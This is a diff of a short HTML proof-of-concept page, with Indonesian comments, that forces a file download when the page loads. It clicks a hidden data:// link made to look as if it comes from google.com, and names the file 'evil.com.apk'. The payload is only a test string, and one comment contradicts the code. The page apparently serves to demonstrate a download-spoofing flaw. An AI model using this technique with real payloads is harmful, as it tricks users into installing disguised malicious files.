@@ -4,24 +4,18 @@
   <title>Auto Download</title>
 </head>
 <body>
-
-  <!-- 
-    INI KODINGAN LO YANG BISA (SAYA KASIH ID "x").
-    Link-nya gue sembunyiin (display:none) biar gak keliatan.
-  -->
-  <a id="x" href="data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=" download="google.apk" style="display:none;">Click</a>
-
   <center><h2>POC by pajarpriandana!</h2></center>
 
   <script>
-    // =============================================
-    // CUMA 3 BARIS INI YANG GUE TAMBAHIN:
-    // Pas halaman kebuka, langsung klik link di atas.
-    // =============================================
     window.onload = function() {
-      document.getElementById('x').click();
+      // Link pake data:// tapi ekstensi diubah jadi .txt
+      const link = document.createElement('a');
+      link.href = "data://google.com/application/octet-stream;base64,ZXN0dGVzdGVzdHRlc3Q=";
+      link.download = "evil.com.apk"; // <-- GANTI .apk jadi .txt
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
     };
   </script>
-
 </body>
 </html>
